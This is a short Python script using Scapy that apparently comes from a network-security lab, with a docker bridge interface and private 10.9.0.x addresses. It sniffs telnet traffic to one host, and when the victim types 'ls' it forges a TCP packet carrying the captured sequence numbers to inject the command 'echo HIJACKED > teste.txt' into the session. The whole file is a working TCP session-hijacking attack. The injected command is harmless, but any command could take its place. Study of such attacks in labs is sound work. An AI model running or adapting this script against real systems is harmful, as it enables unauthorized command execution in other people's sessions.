from scapy.all import *

buffer = ""

def SessionHijacking(pkt):
    global buffer
    
    if pkt.haslayer(Raw):
        payload = pkt[Raw].load
        char = payload.decode('utf-8', errors='ignore')
        buffer += char
        
        if '\r' in buffer:
            if "ls" in buffer.strip():
                ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
                seq = pkt[TCP].seq 
                tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="A", seq=seq, ack=pkt[TCP].ack)
                
                data = "echo HIJACKED > teste.txt\r\n"
                pkt = ip/tcp/data
                ls(pkt)
                send(pkt, verbose=0)
            
            buffer = ""

sniff(iface="br-f9c61e9fd30f", filter="tcp and dst host 10.9.0.6 and dst port 23", prn=SessionHijacking)